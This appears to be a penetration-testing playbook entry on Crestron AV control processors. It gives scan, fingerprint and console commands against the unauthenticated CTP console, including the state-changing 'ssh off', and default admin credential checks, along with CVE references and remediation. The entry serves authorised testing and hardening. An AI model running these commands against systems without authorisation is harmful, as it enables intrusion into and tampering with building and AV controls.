---
id: crestron_avcontrol
technology: "Crestron AV Control Processor / Crestron Webserver"
domain: IoT
category: iot
transport: ip
safety_class: intrusive
severity: critical
life_safety: false
match:
  ports: [41794, 41795, 41796, 41797, 80, 443]
  banners: ["Crestron", "CTP", "crestron console", "Crestron Webserver", "CIP"]
  markers: ["crestron", "ctp console", "crestron toolbox", "cresnet", "/userlogin.html", "Crestron Webserver"]
quick_wins:
  - { cmd: "nmap -Pn -sV -p41794-41797,80,443 --script=banner {host}", safety: safe, note: "Enumerate the Crestron autodiscovery/CTP console range (41794-41797) plus web UI (80/443). Open 41795 with a raw-text banner strongly indicates an unauthenticated CTP console." }
  - { cmd: "printf 'ver\\r\\n' | ncat -w 5 {host} 41795", safety: safe, note: "Read-only recon: connect raw-TCP to the CTP console on 41795 and issue 'ver' to fingerprint the control system firmware. Historically no auth — an interactive prompt confirms full console access." }
  - { cmd: "curl -sk -D - https://{host}/ -o /dev/null; curl -sk -D - http://{host}/ | grep -i 'crestron\\|location\\|server'", safety: safe, note: "Web UI fingerprint — :80 typically redirects to :443. Confirms Crestron Webserver and login page (/userlogin.html) presence." }
  - { cmd: "printf 'hostname\\r\\nipconfig\\r\\nssh off\\r\\n' | ncat -w 8 {host} 41795", safety: intrusive, note: "INTRUSIVE — issues live console commands over the unauthenticated CTP console (config disclosure + state change). Confirm explicit scope authorisation before running; console commands can alter device/AV state." }
  - { cmd: "curl -sk -u admin: 'https://{host}/userlogin.html' -D - -o /dev/null; curl -sk -u admin:admin 'https://{host}/' -D -", safety: intrusive, note: "INTRUSIVE — default/blank admin credential check against the web UI. Factory default is often 'admin' with an empty password. Authenticated request; only with authorisation." }
references:
  - "CVE-2018-11229"
  - "CVE-2018-11228"
  - "CVE-2018-13341"
  - "CVE-2018-5553"
  - "Rapid7 R7-2018-27 (Crestron TSW/MC3 console auth bypass & backdoor)"
  - "Crestron CTP console unauthenticated command shell advisory"
mitre: "T1190"
---
# Crestron AV Control Processor / Crestron Webserver

Crestron control processors (the 3-Series/4-Series MC3/CP3/RMC3 controllers, TSW touch panels, DM
matrix switchers and DMPS presentation systems) are the automation brains of enterprise AV,
conference rooms, executive boardrooms, courtrooms, and building-automation deployments. A single
processor typically drives displays, projectors, audio DSPs, room lighting, motorized shades,
door/room scheduling and — in integrated buildings — HVAC and access hardware over Cresnet and IP.
Because these devices sit on the corporate network but are provisioned by AV integrators rather than
IT, they are frequently deployed with factory defaults and management services fully exposed.

**Attack surface.** The highest-value target is the **CTP (Crestron Terminal Protocol) console** on
TCP **41794-41797** (41795 is the classic console port). CTP is a raw-TCP text shell that, on a large
installed base of firmware, requires **no authentication** — connecting drops you straight into the
control-system command prompt with full read/write access to configuration, network settings,
program state and the AV/control logic itself. Alongside CTP, Crestron Toolbox autodiscovery uses the
same high-port range, the **web UI** on :80/:443 (:80 redirects to HTTPS, login at `/userlogin.html`)
ships with **default or blank `admin` credentials**, and **Cresnet** provides the low-level device
bus. Rapid7's R7-2018-27 disclosure documented an authentication bypass, an undocumented engineering
backdoor, and console command injection across multiple Crestron models (CVE-2018-11228 / -11229 /
-13341 / -5553), and the unauthenticated CTP console remains the most reliable foothold in the field.

**Exploitation.** Highest-probability foothold, in order:

1. **Map the console.** `nmap -Pn -sV -p41794-41797,80,443 {host}` — an open 41795 emitting a
   plaintext banner is the tell.
2. **Safe recon on CTP.** Raw-connect and fingerprint without changing state:
   `printf 'ver\r\n' | ncat -w 5 {host} 41795`. If you get a firmware banner and an interactive
   prompt, the console is unauthenticated and you already have control-plane access.
3. **Intrusive console commands (authorised only).** Over the same 41795 session, Crestron console
   verbs like `hostname`, `ipconfig`, `showhw`, `progcomments`, `reportcresnet` disclose the full
   device/AV inventory; write verbs (`ssh`, `webserver`, `ipt`, `reboot`, program `load`) change
   device state. Treat everything past `ver` as intrusive and gate it on written scope authorisation.
4. **Web UI default creds.** In parallel, try `admin` with a blank password (then `admin:admin`)
   against `/userlogin.html` / `https://{host}/`. A successful login yields the same configuration
   authority through the web management interface.

**Remediation.** Update to current Crestron firmware (post-2018 releases close the R7-2018-27 auth
bypass and backdoor); disable the CTP console and Telnet where unused, or require console
authentication; set a strong non-default `admin` password on the web UI and enable SSL; place all
control processors on an isolated AV/OT management VLAN with source-IP ACLs so the 41794-41797 range
is never reachable from user or internet-facing segments; and disable Crestron Toolbox autodiscovery
in production.
